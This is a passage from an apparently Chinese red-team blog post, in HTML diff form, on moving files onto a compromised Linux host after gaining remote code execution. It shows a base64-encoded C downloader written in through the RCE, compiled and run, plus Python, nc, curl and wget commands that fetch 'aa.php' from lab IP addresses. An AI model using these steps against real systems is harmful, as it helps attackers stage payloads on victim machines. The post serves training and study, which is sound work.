class="attribute">PSBpKQoJCXsKCQkJcmV0dXJuIG9mZnNldDsKCQl9Cgl9CgkKCXJldHVybiAtMTsKfQoKLyoqCiAq</span></span><br><span class="line"><span class="attribute">IEBicmllZiDkuI5VUkzlu7rnq4vov57mjqXvvIzlubbojrflj5Zzb2NrX2ZkCiAqCiAqIEBwYXJh</span></span><br><span class="line"><span class="attribute">bSB1cmwgW2luXSAJVVJM5Zyw5Z2ACiAqCiAqIEByZXR1cm4gc29ja19mZAogKi8KaW50IGdldHVy</span></span><br><span class="line"><span class="attribute">bChjaGFyKiB1cmwpCnsKCWludAkJCWNmZDsKCXN0cnVjdCBzb2NrYWRkcl9pbgljYWRkOwoJc3Ry</span></span><br><span class="line"><span class="attribute">dWN0IGhvc3RlbnQJCSpwVVJMID0gTlVMTDsKCWNoYXIJCQlob3N0W0JVRlNJWkVdLCBHRVRbQlVG</span></span><br><span class="line"><span class="attribute">U0laRV07CgljaGFyCQkJcmVxdWVzdFtCVUZTSVpFXTsKCWNoYXIJCQl0ZXh0W0JVRlNJWkVdID0g</span></span><br><span class="line"><span class="attribute">ezB9OwoKCS8v5YiG56a75Li75py65Lit55qE5Li75py65Zyw5Z2A5ZKM55u45a</span>+<span class="number">56</span>Lev<span class="number">5</span>b<span class="number">6</span>ECglt</span><br><span class="line"><span class="attribute">ZW1zZXQoaG9zdCwgMCwgQlVGU0laRSk7CgltZW1zZXQoR0VULCAwLCBCVUZTSVpFKTsKCW1lbXNl</span></span><br><span class="line"><span class="attribute">dChyZXF1ZXN0LCAwLCBCVUZTSVpFKTsKCW1lbXNldCh0ZXh0LCAwLCBCVUZTSVpFKTsKCQoJc3Nj</span></span><br><span class="line"><span class="attribute">YW5mKHVybCwgIiUqW14vL10vLyVbXi9dJXMiLCBob3N0LCBHRVQpOwoKCXByaW50ZigiR0VUID0g</span></span><br><span class="line"><span class="attribute">JXNcbiIsIEdFVCk7CglwcmludGYoImhvc3QgPSAlc1xuIiwgaG9zdCk7CglwcmludGYoInVybCA9</span></span><br><span class="line"><span class="attribute">ICVzXG4iLCB1cmwpOwoKCS8v6K6</span>+<span class="number">572</span>uc<span class="number">29</span>ja<span class="number">2</span>V<span class="number">05</span>Y+C<span class="number">5</span>pWwCglpZiAoLTEgPT<span class="number">0</span>gKGNmZCA<span class="number">9</span>IHNv</span><br><span class="line"><span class="attribute">Y2tldCggQUZfSU5FVCwgU09DS19TVFJFQU0sIDApKSkKCXsKCQlwcmludGYoICJjcmVhdGUgc29j</span></span><br><span class="line"><span class="attribute">a2V0IGZhaWxlZCBvZiBjbGllbnQhXG4iICk7CgkJcmV0dXJuIC0xOwoJfQoKCS8v5bCG5LiK6Z2i</span></span><br><span class="line"><span class="attribute">6I635b6X55qE5Li75py65L</span>+h<span class="number">5</span>oGv<span class="number">6</span>YCa<span class="number">6</span>L+H<span class="number">5</span>Z+f<span class="number">5</span>ZCN<span class="number">6</span>Kej<span class="number">5</span>p<span class="number">6</span>Q<span class="number">5</span>Ye<span class="number">95</span>pWw<span class="number">6</span>I<span class="number">635</span>b<span class="number">6</span>X<span class="number">5</span>Z+f<span class="number">5</span>ZCN</span><br><span class="line"><span class="attribute">5L</span>+h<span class="number">5</span>oGvCglwVVJMID<span class="number">0</span>gZ<span class="number">2</span>V<span class="number">0</span>aG<span class="number">9</span>zdGJ<span class="number">5</span>bmFtZShob<span class="number">3</span>N<span class="number">0</span>KTsKCgkvL+iuvue<span class="number">9</span>rklQ<span class="number">5</span>Zyw<span class="number">5</span>Z<span class="number">2</span>A<span class="number">57</span>uT</span><br><span class="line"><span class="attribute">5p6ECgliemVybygmY2FkZCwgc2l6ZW9mKHN0cnVjdCBzb2NrYWRkcl9pbikpOwoJY2FkZC5zaW5f</span></span><br><span class="line"><span class="attribute">ZmFtaWx5CQkJPSBBRl9JTkVUOwoJY2FkZC5zaW5fYWRkci5zX2FkZHIJPSAqKCh1bnNpZ25lZCBs</span></span><br><span class="line"><span class="attribute">b25nICopcFVSTC0</span>+aF<span class="number">9</span>hZGRyX<span class="number">2</span>xpc<span class="number">3</span>RbMF<span class="number">0</span>pOwoJY<span class="number">2</span>FkZC<span class="number">5</span>zaW<span class="number">5</span>fcG<span class="number">9</span>ydAkJCT<span class="number">0</span>gaHRvbnMoODAp</span><br><span class="line"><span class="attribute">OwoJCgkvL</span>+WQkUhUVFDmnI<span class="number">3</span>liqHlmajlj<span class="number">5</span>HpgIFVUkzkv<span class="number">6</span>Hmga<span class="number">8</span>KCXNucHJpbnRmKHJlcXVlc<span class="number">3</span>Qs</span><br><span class="line"><span class="attribute">IEJVRlNJWkUsIAkJXAoJCQkJIkdFVCAlcyBIVFRQLzEuMVxyXG4iCgkJCQkiSE9TVDogJXNcclxu</span></span><br><span class="line"><span class="attribute">IgoJCQkJIkNhY2hlLUNvbnRyb2w6IG5vLWNhY2hlXHJcbiIKCQkJCSJDb25uZWN0aW9uOiBjbG9z</span></span><br><span class="line"><span class="attribute">ZVxyXG5cclxuIiwKCQkJCUdFVCxob3N0KTsKCglwcmludGYoIlxucmVxdWVzdCA9IFxuJXNcbiIs</span></span><br><span class="line"><span class="attribute">IHJlcXVlc3QpOwoJCgkvL</span>+i/nuaOpeacjeWKoeWZqAoJaWYgKC<span class="number">0</span>xID<span class="number">09</span>IGNvbm<span class="number">5</span>lY<span class="number">3</span>QoY<span class="number">2</span>ZkLCAo</span><br><span class="line"><span class="attribute">c3RydWN0IHNvY2thZGRyICopJmNhZGQsIChzb2NrbGVuX3Qpc2l6ZW9mKGNhZGQpKSkKCXsKCQlw</span></span><br><span class="line"><span class="attribute">cmludGYoICJjb25uZWN0IGZhaWxlZCBvZiBjbGllbnQhXG4iICk7CgkJcmV0dXJuIC0xOwoJfQoK</span></span><br><span class="line"><span class="attribute">CS8v5ZCR5pyN5Yqh5Zmo5Y</span>+R<span class="number">6</span>YCBdXJs<span class="number">6</span>K+<span class="number">35</span>rGC<span class="number">55</span>qEcmVxdWVzdAoJaWYgKC<span class="number">0</span>xID<span class="number">09</span>c<span class="number">2</span>VuZChj</span><br><span class="line"><span class="attribute">ZmQsIHJlcXVlc3QsIHN0cmxlbiggcmVxdWVzdCApLCAwICkpCgl7CgkJcHJpbnRmKCAi5ZCR5pyN</span></span><br><span class="line"><span class="attribute">5Yqh5Zmo5Y</span>+R<span class="number">6</span>YCB<span class="number">6</span>K+<span class="number">35</span>rGC<span class="number">55</span>qEcmVxdWVzdOWksei<span class="number">0</span>pSFcbiIgKTsKCQlyZXR<span class="number">1</span>cm<span class="number">4</span>gLTE<span class="number">7</span>Cgl<span class="number">9</span></span><br><span class="line"><span class="attribute">CgoJLy</span>/lrqLmiLfnq<span class="number">6</span>/mjqXmlLbmnI<span class="number">3</span>liqHlmajnmoTov<span class="number">5</span>Tlm<span class="number">57</span>kv<span class="number">6</span>Hmga<span class="number">8</span>KCWdldEh<span class="number">0</span>dHBIZWFk</span><br><span class="line"><span class="attribute">KGNmZCwgdGV4dCwgc2l6ZW9mKHRleHQpKTsKCXByaW50ZigiaGVhZCA9IDpcbiVzXG4iLCB0ZXh0</span></span><br><span class="line"><span class="attribute">KTsKCQoJcmV0dXJuIGNmZDsKfQoKCi8qKgogKiBAYnJpZWYg6I635Y</span>+WVVJM<span class="number">5</span>Lit<span class="number">55</span>qE<span class="number">5</span>paH<span class="number">5</span>Lu<span class="number">2</span></span><br><span class="line"><span class="attribute">5ZCNCiAqCiAqIEBwYXJhbSBVUkxQYXRoIFtpbl0gCVVSTOWcsOWdgAogKgogKiBAcmV0dXJuIOaW</span></span><br><span class="line"><span class="attribute">h</span>+S<span class="number">7</span>tuWQjQogKi<span class="number">8</span>KY<span class="number">2</span>hhciAqR<span class="number">2</span>V<span class="number">0</span>RmlsZU<span class="number">5</span>hbWUoY<span class="number">2</span>hhciAqVVJMUGF<span class="number">0</span>aCkKewogICAgY<span class="number">2</span>hhciBj</span><br><span class="line"><span class="attribute">aCA9ICcvJzsKICAgIGNoYXIgKnEgPSBzdHJyY2hyKFVSTFBhdGgsIGNoKSArIDE7CgogICAgcmV0</span></span><br><span class="line"><span class="attribute">dXJuIHE7Cn0KCmludCBtYWluKGludCBhcmdjLCBjaGFyKiBhcmd2W10pCnsKCWludCBzb2NrZmQg</span></span><br><span class="line"><span class="attribute">PSAtMTsKCWNoYXIJCWJ1ZltCVUZTSVpFXSA9IHswfTsKCWNoYXIJCWZpbGVOYW1lW0JVRlNJWkVd</span></span><br><span class="line"><span class="attribute">ID0gezB9OwoJaW50CQkJZmQgPSAtMTsKCQoJaWYgKCBhcmdjIDwgMiApCgl7CgkJcHJpbnRmKCAi</span></span><br><span class="line"><span class="attribute">55So5rOVOiVzIHVybOe9kemhtee9keWdgFxuIiwgYXJndlswXSApOwoJCXJldHVybiAtMTsKCX0K</span></span><br><span class="line"><span class="attribute">CQoJc3RybmNweShmaWxlTmFtZSwgR2V0RmlsZU5hbWUoYXJndlsxXSksIEJVRlNJWkUpOwoJc29j</span></span><br><span class="line"><span class="attribute">a2ZkID0gZ2V0dXJsKGFyZ3ZbMV0pOwoJCglwcmludGYoImZpbGVOYW1lID0gJXNcbiIsIGZpbGVO</span></span><br><span class="line"><span class="attribute">YW1lKTsKCXJlbW92ZShmaWxlTmFtZSk7CgkKCWZkID0gb3BlbihmaWxlTmFtZSwgT19XUk9OTFkg</span></span><br><span class="line"><span class="attribute">fCBPX0NSRUFULCA3NzcgKTsKCWlmKGZkID09IC0xKQoJewoJCXBlcnJvciggIk9QZW4gZXJyb3Ii</span></span><br><span class="line"><span class="attribute">ICk7CgkJcmV0dXJuIC0xOwoJfQoJCgl3aGlsZSAoMSkKCXsKCQltZW1zZXQoIGJ1ZiwgMCwgQlVG</span></span><br><span class="line"><span class="attribute">U0laRSApOwoJCWludCBjcjsKCQljciA9IHJlY3Yoc29ja2ZkLCBidWYsIEJVRlNJWkUsIDApOwoJ</span></span><br><span class="line"><span class="attribute">CWlmICggY3IgPD0gMCApCgkJewoJCQlwcmludGYoImJyZWFrXG4iKTsKCQkJYnJlYWs7CgkJfQoJ</span></span><br><span class="line"><span class="attribute">CXdyaXRlKGZkLCBidWYsIGNyKTsKCX0KCQoJY2xvc2UoZmQpOwoJY2xvc2Uoc29ja2ZkKTsKCXJl</span></span><br><span class="line"><span class="attribute">dHVybiAwOwp9CgoK</span></span><br></pre></td></tr></table></figure>
+
+<p>我们在RCE漏洞下执行如下命令将上述base64字符串写入</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;xxxxx&quot;</span> &gt; shadowget.txt</span><br><span class="line"></span><br><span class="line">[root@vuln <span class="string">/tmp</span>]<span class="comment"># base64 -d shadowget.txt &gt; shadowget.c</span></span><br><span class="line">[root@vuln <span class="string">/tmp</span>]<span class="comment"># gcc -o shadowget shadowget.c</span></span><br><span class="line">[root@vuln <span class="string">/tmp</span>]<span class="comment"># ./shadowget http://172.16.42.151/aa.php</span></span><br><span class="line">GET = <span class="string">/aa.php</span></span><br><span class="line">host = 172.16.42.151</span><br><span class="line">url = http:<span class="string">//172.16.42.151/aa.php</span></span><br><span class="line"><span class="string">......</span></span><br><span class="line">fileName = aa.php</span><br><span class="line">break</span><br><span class="line">[root@vuln <span class="string">/tmp</span>]<span class="comment"># ls</span></span><br><span class="line">1.txt  aa.php shadowget.txt shadowget.c shadowget</span><br><span class="line">[root@vuln <span class="string">/tmp</span>]<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p>使用<code>./shadowget http://172.16.42.151/aa.php</code>成功下载了aa.php</p>
+<h2 id="python脚本下载"><a href="#python脚本下载" class="headerlink" title="python脚本下载"></a>python脚本下载</h2><p>跟上述方法一样转为base64写入</p>
+<ul>
+<li>a.py</li>
+</ul>
+<figure class="highlight qml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib </span><br><span class="line"><span class="built_in">url</span> = <span class="string">&#x27;http://172.16.42.151/aa.php&#x27;</span>  </span><br><span class="line">urllib.urlretrieve(<span class="built_in">url</span>, <span class="string">&quot;aa.php&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>最后执行<code>python a.py</code></p>
+<figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@vuln /tmp]<span class="comment"># ls</span></span><br><span class="line">aa.php</span><br><span class="line">[root@vuln /tmp]<span class="comment"># python a.py</span></span><br><span class="line">[root@vuln /tmp]<span class="comment"># ls</span></span><br><span class="line">aa.php  a.py</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="使用nc传输"><a href="#使用nc传输" class="headerlink" title="使用nc传输"></a>使用nc传输</h2><p>vps作为服务端</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvvp <span class="number">33033</span> &lt; aa.php</span><br></pre></td></tr></table></figure>
+
+<p>靶机作为客户端下载</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nc</span> <span class="number">172.16.42.150</span> <span class="number">33033</span> &gt; aa.php</span><br></pre></td></tr></table></figure>
+
+<p>靶机下载完后后关闭</p>
+<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root<span class="symbol">@vuln</span> /tmp]<span class="meta"># ls</span></span><br><span class="line">[root<span class="symbol">@vuln</span> /tmp]<span class="meta"># nc 172.16.42.150 33033 &gt; aa.ph</span></span><br><span class="line">^C</span><br><span class="line">[root<span class="symbol">@vuln</span> /tmp]<span class="meta"># cat aa.php</span></span><br><span class="line">sdfsdfsdf</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="使用curl命令下载"><a href="#使用curl命令下载" class="headerlink" title="使用curl命令下载"></a>使用curl命令下载</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http:<span class="regexp">//</span><span class="number">172.16</span>.<span class="number">42.151</span>/aa.php -o aa</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="使用wget命令下载"><a href="#使用wget命令下载" class="headerlink" title="使用wget命令下载"></a>使用wget命令下载</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http:<span class="regexp">//</span><span class="number">172.16</span>.<span class="number">42.151</span>/aa.php</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://www.codeleading.com/article/62605839291/">https://www.codeleading.com/article/62605839291/</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Linux%E5%AE%89%E5%85%A8/" rel="tag"># Linux安全</a>
+              <a href="/tags/%E7%BA%A2%E9%98%9F%E6%8A%80%E6%9C%AF/" rel="tag"># 红队技术</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/LD-PRELOAD%E5%AD%A6%E4%B9%A0/" rel="prev" title="LD_PRELOAD学习">
+      <i class="fa fa-chevron-left"></i> LD_PRELOAD学习
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/CodeQL2-%E7%BC%96%E5%86%99%E6%9F%A5%E8%AF%A2/" rel="next" title="CodeQL2-编写查询">
+      CodeQL2-编写查询 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BC%96%E8%AF%91c%E4%BB%A3%E7%A0%81%E4%B8%8B%E8%BD%BD"><span class="nav-text">编译c代码下载</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#python%E8%84%9A%E6%9C%AC%E4%B8%8B%E8%BD%BD"><span class="nav-text">python脚本下载</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8nc%E4%BC%A0%E8%BE%93"><span class="nav-text">使用nc传输</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8curl%E5%91%BD%E4%BB%A4%E4%B8%8B%E8%BD%BD"><span class="nav-text">使用curl命令下载</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8wget%E5%91%BD%E4%BB%A4%E4%B8%8B%E8%BD%BD"><span class="nav-text">使用wget命令下载</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-text">参考</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Vinci"
+      src="/images/touxiang.jpeg">
+  <p class="site-author-name" itemprop="name">Vinci</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">55</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">34</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/vinci-3000" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;vinci-3000" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/Vinci_YNM3000" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;Vinci_YNM3000" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Vinci</span>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
